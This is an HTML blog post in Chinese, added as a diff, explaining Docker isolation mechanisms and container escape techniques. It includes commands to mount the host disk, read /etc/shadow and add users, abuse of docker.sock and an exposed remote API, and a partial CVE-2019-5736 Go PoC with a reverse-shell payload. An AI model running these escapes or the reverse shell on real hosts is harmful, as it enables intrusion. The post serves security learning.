@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Docker-escape - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+云😶‍🌫️
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Docker-escape" />
+<meta property="og:description" content="
+云😶‍🌫️
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/docker-escape/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-06T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-03-06T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Docker-escape"/>
+<meta name="twitter:description" content="
+云😶‍🌫️
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Docker-escape</h1>
+			<div class="meta">Posted on Mar 6, 2024</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>云😶‍🌫️</p>
+</blockquote>
+<p>OCI（Open Container Initiative）规范是事实上的容器标准，已经被大部分容器实现以及容器编排系统所采用，包括 Docker 和 Kubernetes。</p>
+<p>从 OCI 规范开始了解容器镜像，可以让我们对容器技术建立更全面清晰的认知，而不是囿于实现细节。OCI 规范分为 <code>Image spec</code> 和 <code>Runtime spec</code> 两部分，它们分别覆盖了容器生命周期的不同阶段</p>
+<h2 id="docker核心原理">Docker核心原理</h2>
+<p>Docker 是一个开源的应用容器引擎，基于 <a href="https://www.runoob.com/go/go-tutorial.html">Go 语言</a> 并遵从 Apache2.0 协议开源。</p>
+<p>Docker的实现依赖于Linux中众多的基础机制，包括用于资源限制的cgroup，用于隔离的Namespace，以及用于实现docker文件系统的Union FS等。</p>
+<h3 id="namespace">namespace</h3>
+<p>资源隔离</p>
+<p>Linux的 namespace 可以实现资源能够在不同的命名空间里有相同的名称，譬如在 <code>A命名空间</code> 有个pid为1的进程，而在 <code>B命名空间</code> 中也可以有一个pid为1的进程。</p>
+<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/nsproxy.h#L31">nsproxy.h</a>，7种namespace，对于每个任务 <code>task_struct</code> 都存在一个nsproxy 成员</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * A structure to contain pointers to all per-process
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * namespaces - fs (mount), uts, network, sysvipc, etc.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * The pid namespace is an exception -- it&#39;s accessed using
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * task_active_pid_ns.  The pid namespace here is the
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * namespace that children will use.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * &#39;count&#39; is the number of tasks holding a reference.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * The count for each namespace, then, will be the number
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * of nsproxies pointing to it, not the number of tasks.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * The nsproxy is shared by tasks which share all namespaces.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * As soon as a single namespace is cloned or unshared, the
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * nsproxy is copied.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">nsproxy</span> {
+</span></span><span style="display:flex;"><span>	refcount_t count;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">uts_namespace</span> <span style="color:#ff79c6">*</span>uts_ns;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">ipc_namespace</span> <span style="color:#ff79c6">*</span>ipc_ns;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">mnt_namespace</span> <span style="color:#ff79c6">*</span>mnt_ns;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pid_namespace</span> <span style="color:#ff79c6">*</span>pid_ns_for_children;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">net</span> 	     <span style="color:#ff79c6">*</span>net_ns;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">time_namespace</span> <span style="color:#ff79c6">*</span>time_ns;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">time_namespace</span> <span style="color:#ff79c6">*</span>time_ns_for_children;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">cgroup_namespace</span> <span style="color:#ff79c6">*</span>cgroup_ns;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>namespace也是linux内核的一个特性，它将内核资源分隔开，一组进程能看到一些资源，而其他组的进程看到的是不同的资源，组与组之间互不干扰，不知道对方的存在。简单来说，namespace就是内核提供的一种进程间资源隔离技术。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ubuntu@ubuntu:~$ ls -al /proc/self/ns
+</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>dr-x--x--x <span style="color:#bd93f9">2</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 .
+</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#bd93f9">9</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 cgroup -&gt; <span style="color:#f1fa8c">&#39;cgroup:[4026531835]&#39;</span>
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 ipc -&gt; <span style="color:#f1fa8c">&#39;ipc:[4026531839]&#39;</span>
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 mnt -&gt; <span style="color:#f1fa8c">&#39;mnt:[4026531841]&#39;</span>
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 net -&gt; <span style="color:#f1fa8c">&#39;net:[4026531840]&#39;</span>
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 pid -&gt; <span style="color:#f1fa8c">&#39;pid:[4026531836]&#39;</span>
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 pid_for_children -&gt; <span style="color:#f1fa8c">&#39;pid:[4026531836]&#39;</span>
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 <span style="color:#8be9fd;font-style:italic">time</span> -&gt; <span style="color:#f1fa8c">&#39;time:[4026531834]&#39;</span>
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 time_for_children -&gt; <span style="color:#f1fa8c">&#39;time:[4026531834]&#39;</span>
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 user -&gt; <span style="color:#f1fa8c">&#39;user:[4026531837]&#39;</span>
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#bd93f9">1</span> ubuntu ubuntu <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 09:28 uts -&gt; <span style="color:#f1fa8c">&#39;uts:[4026531838]&#39;</span>
+</span></span></code></pre></div><p>与其有关的系统调用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># 有个unshare的命令，需要区分一下</span>
+</span></span><span style="display:flex;"><span>$ man <span style="color:#bd93f9">2</span> unshare
+</span></span><span style="display:flex;"><span>$ man clone
+</span></span></code></pre></div><p>unshare创建命名空间</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>:/ <span style="color:#6272a4"># readlink /proc/$$/ns/uts </span>
+</span></span><span style="display:flex;"><span>uts:<span style="color:#ff79c6">[</span>4026531838<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>:/ <span style="color:#6272a4"># unshare --uts /bin/bash</span>
+</span></span><span style="display:flex;"><span>:/ <span style="color:#6272a4"># readlink /proc/$$/ns/uts </span>
+</span></span><span style="display:flex;"><span>uts:<span style="color:#ff79c6">[</span>4026532690<span style="color:#ff79c6">]</span>
+</span></span></code></pre></div><h3 id="cgroup">cgroup</h3>
+<p>资源限制</p>
+<p>cgroup（control group）是linux内核的一个特性，它可以用于限制、计算、隔离进程组对计算机资源的使用（如CPU、memory、disk I/O、network等）。</p>
+<p>cgroup有如下四个功能：</p>
+<ol>
+<li>资源限制（Resource limits）：限制进程组对某一特定资源（CPU，disk，或network）的使用量</li>
+<li>优先级（Prioritization）：通过给某个cgroup中的进程分配多一些资源（相比于其他cgroup），从而提高优先级</li>
+<li>审计（Accounting）：记录进程/进程组使用的资源量</li>
+<li>控制（Control）：进程组控制，如可以使用freezer将进程组挂起或恢复</li>
+</ol>
+<p>cgroup是容器（containers）的一个重要组成部分，因为容器中通常会运行多个进程，这些进程通常需要一并控制。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /proc/self/cgroup
+</span></span><span style="display:flex;"><span>0::/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-4f943e0d-c769-40ec-92df-ca2643d86752.scope
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ls -al /sys/fs/cgroup		<span style="color:#6272a4"># 查看cgroup文件系统，目录下每个目录代表一个cgroup类型。每一个cgroup类都遵循层级结构</span>
+</span></span></code></pre></div><h3 id="union-fs">Union FS</h3>
+<p>Union File System ，简称 UnionFS，<strong>把其他文件系统联合到一个联合挂载点的文件系统服务</strong>，目的是<strong>将多个文件联合在一起成为一个统一的视图</strong></p>
+<p>它的思想是，如果一个资源是重复的，但没有任何修改，这时候并不需要立即创建一个新的资源，这个资源可以被新旧实例共享。</p>
+<p>创建新资源发生在第一次写操作，也就是对资源进行修改的时候。通过这种资源共享的方式，可以显著地减少未修改资源复制带来的消耗，但是也会在进行资源修改的时候增减小部分的开销。</p>
+<p>OverlayFS：Overlayfs 是一种堆叠文件系统，它依赖并建立在其它的文件系统之上（例如 ext4fs 和 xfs 等等），并不直接参与磁盘空间结构的划分，仅仅将原来底层文件系统中不同的目录进行“合并”，然后向用户呈现。<a href="https://zhuanlan.zhihu.com/p/679328995">OverlayFS</a></p>
+<h3 id="more">MORE</h3>
+<p>如果觉得不明白，可以自己写一个简单的Docker</p>
+<ul>
+<li><a href="https://www.infoq.com/articles/build-a-container-golang/">Build Your Own Container Using Less than 100 Lines of Go</a></li>
+<li><a href="https://www.wolai.com/curry00/rjPry5XyA6BLYyUoEaDWDm">手写docker</a></li>
+</ul>
+<h2 id="docker逃逸">Docker逃逸</h2>
+<h3 id="检测docker环境">检测Docker环境</h3>
+<ul>
+<li>检查根目录下是否存在<code>.dockerenv</code>文件</li>
+<li>检查 <code>/proc/1/cgroup</code> 是否存在含有docker字符串!</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@06fcbcd12128:/# ls -al /
+</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">60</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">4096</span> Mar  <span style="color:#bd93f9">6</span> 01:52 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">4096</span> Mar  <span style="color:#bd93f9">6</span> 01:52 ..
+</span></span><span style="display:flex;"><span>-rwxr-xr-x   <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">0</span> Mar  <span style="color:#bd93f9">6</span> 01:52 .dockerenv
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ???</span>
+</span></span><span style="display:flex;"><span>root@06fcbcd12128:/# cat /proc/1/cgroup
+</span></span><span style="display:flex;"><span>0::/
+</span></span></code></pre></div><h3 id="docker-启动容器的危险配置">Docker 启动容器的危险配置</h3>
+<p>如果设定了以下配置就会导致相应的隔离机制失效：</p>
+<ul>
+<li>&ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破</li>
+<li>&ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破</li>
+<li>&ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破</li>
+<li>&ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破</li>
+</ul>
+<p>当操作者执行<code>docker run --privileged</code>时，Docker将允许容器访问宿主机上的所有设备，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。可以通过写ssh密钥、计划任务等方式达到逃逸。</p>
+<p>判断是否为特权模式：CapEff 主要是检查线程的执行权限。如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff <a href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html">(1)</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># 特权级下</span>
+</span></span><span style="display:flex;"><span>bash-4.4# cat /proc/1/status | grep Cap
+</span></span><span style="display:flex;"><span>CapInh: <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span>CapPrm: 0000003fffffffff
+</span></span><span style="display:flex;"><span>CapEff: 0000003fffffffff
+</span></span><span style="display:flex;"><span>CapBnd: 0000003fffffffff
+</span></span><span style="display:flex;"><span>CapAmb: <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 非特权级下</span>
+</span></span><span style="display:flex;"><span>root@a8a2a8be5ee4:/# cat /proc/1/status | grep Cap
+</span></span><span style="display:flex;"><span>CapInh:	<span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span>CapPrm:	00000000a80425fb
+</span></span><span style="display:flex;"><span>CapEff:	00000000a80425fb
+</span></span><span style="display:flex;"><span>CapBnd:	00000000a80425fb
+</span></span><span style="display:flex;"><span>CapAmb:	<span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ubuntu@ubuntu:~$ capsh --decode<span style="color:#ff79c6">=</span>0000003fffffffff
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">0x0000003fffffffff</span><span style="color:#ff79c6">=</span>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+</span></span></code></pre></div><p>挂载文件系统进行逃逸</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># 查看磁盘文件</span>
+</span></span><span style="display:flex;"><span>fdisk -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 挂载</span>
+</span></span><span style="display:flex;"><span>mkdir -p hacker
+</span></span><span style="display:flex;"><span>mount /dev/sda1 /hacker
+</span></span><span style="display:flex;"><span>cat /hacker/etc/shadow
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 定时任务</span>
+</span></span><span style="display:flex;"><span>/hacker/var/spool/cron/crontabs/root
+</span></span></code></pre></div><p>也可以添加新的用户进行登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mount /dev/sda1 /mnt
+</span></span><span style="display:flex;"><span>chroot /mnt adduser john
+</span></span></code></pre></div><h3 id="docker危险挂载">Docker危险挂载</h3>
+<h4 id="dockersock">docker.sock</h4>
+<p>docker.sock是<strong>Docker守护进程(Docker daemon)<strong>默认监听的</strong>Unix域套接字(Unix domain socket)</strong>，容器中的进程可以通过它与Docker守护进程进行通信。</p>
+<p>docker.sock挂载</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -itd -v /var/run/docker.sock:/var/run/docker.sock id
+</span></span></code></pre></div><p>检测</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -lah /var/run/docker.sock
+</span></span></code></pre></div><h4 id="根目录">根目录</h4>
+<p>相当于直接写主机的根目录了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chroot /mount_dir
+</span></span></code></pre></div><h4 id="procfs">procfs</h4>
+<p>查看是否挂载</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name core_pattern
+</span></span></code></pre></div><p>逃逸，<a href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html">(2)</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># 寻找在主机下的绝对路径</span>
+</span></span><span style="display:flex;"><span>cat /proc/mounts | xargs -d <span style="color:#f1fa8c">&#39;,&#39;</span> -n <span style="color:#bd93f9">1</span> | grep workdir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 写入反弹 shell 到目标的 proc 目录下</span>
+</span></span></code></pre></div><h3 id="docker-remote-api">Docker remote API</h3>
+<p>通过将宿主机的docker服务通过socket的方式暴露给外部连接，使得其他主机也可以访问docker服务。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
+</span></span></code></pre></div><p>可以利用 remote API 来操作docker进行逃逸</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># 查看容器</span>
+</span></span><span style="display:flex;"><span>curl http://&lt;target&gt;:2375/containers/json
+</span></span><span style="display:flex;"><span>docker -H tcp://&lt;target&gt;:2375 ps -a
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 将远程的根目录挂载</span>
+</span></span><span style="display:flex;"><span>docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash
+</span></span></code></pre></div><h3 id="程序漏洞导致docker-逃逸">程序漏洞导致Docker 逃逸</h3>
+<p>使用 <code>docker version</code> 命令可以看到 <code>runc &amp;&amp; containerd</code> 组件</p>
+<h4 id="runc">runc</h4>
+<p>runc是一个底层服务工具，runC 管理容器的创建，运行，销毁等，docker部分版本服务运行时底层其实在运行着runc服务，攻击者可以通过特定的容器镜像或者exec操作重写宿主机上的runc 二进制文件，并在宿主机上以root身份执行命令。</p>
+<p>一个容器开启时，可以分为以下三步</p>
+<ul>
+<li>fork 创建子进程</li>
+<li>初始化容器化环境</li>
+<li>将执行流重定向到用户提供的入口点</li>
+</ul>
+<p><code>docker run</code>等命令的时候实际上在底层调用的是runC程序，我们在容器中运行 <code>/bin/bash</code> 也会调用到runC</p>
+<p><img src="https://ts1.cn.mm.bing.net/th/id/R-C.cd098a90bebc7feb12058053becebedc?rik=DLvUCkgJJdKuYg&amp;riu=http%3a%2f%2fxuxinkun.github.io%2fimg%2fdocker-oci-runc-k8s%2fkubelet.png&amp;ehk=mGer8iOXT1GplC3OjM4e3sLhuBjr74asYNM3BLOwePA%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0" alt="runc"></p>
+<p>procfs:</p>
+<ul>
+<li><code>/proc/[PID]/exe</code>: 一种特殊的软连接，是该进程自身对应的本地文件</li>
+<li><code>/proc/[PID]/fd/</code>: 这个目录下存放了该进程打开的所有文件描述符</li>
+</ul>
+<p><code>/proc/[PID]/exe</code>的特殊之处在于当权限通过的情况下打开这个文件，内核将会之间返回一个指向该文件的文件描述符，并非按照传统的打开方式做路径分析和文件查找，这就会导致绕过了mnt命名空间和chroot的限制。</p>
+<p>CVE-2019-5736：该漏洞允许攻击者重写宿主机上的runc 二进制文件，导致攻击者可以在宿主机上以root身份执行命令。</p>
+<ul>
+<li>修改容器内的<code>/bin/sh</code>文件，改为<code>#!/proc/self/exe</code>，这样的话，当容器内的<code>/bin/sh</code>被执行的时候，实际上被执行的文件路径是<code>/proc/self/exe</code></li>
+<li><code>/proc/self/exe</code>是内核为每个进程创建的符号链接，指向<strong>为该进程而执行的二进制文件</strong>。当容器中的<code>/bin/sh</code>被执行时，<code>/proc/self/exe</code>指向的宿主机上的<code>runc</code>就会被执行</li>
+</ul>
+<p>漏洞的存在原理在于/proc/pid/exe这个绑定的方式，/proc是比较熟知的一个概念，为一个虚拟文件系统，其中的文件能够显示当前的进程运行信息。/proc/pid/exe是一个程序链接，指向这个pid运行的程序。</p>
+<p>而这个漏洞的利用方式就在于，在docker里查找到runc的exe，获取对应于该位置的一个文件句柄，然后向这个位置写入东西的话，就能够将宿主机的程序覆盖掉，然后用户下一次再要运行runc的时候，就会触发反弹shell。</p>
+<p>PoC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> main
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Implementation of CVE-2019-5736
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// Created with help from @singe, @_cablethief, and @feexd.
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// This commit also helped a ton to understand the vuln
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;io/ioutil&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;os&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;strconv&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;strings&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// This is the line of shell commands that will execute on the host
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// 替换IP 和 PORT
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">var</span> payload = <span style="color:#f1fa8c">&#34;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp; 1 &amp;\n&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//首先来看看能不能打开/bin/sh，即有root权限就成
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	fd, err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Create</span>(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>)
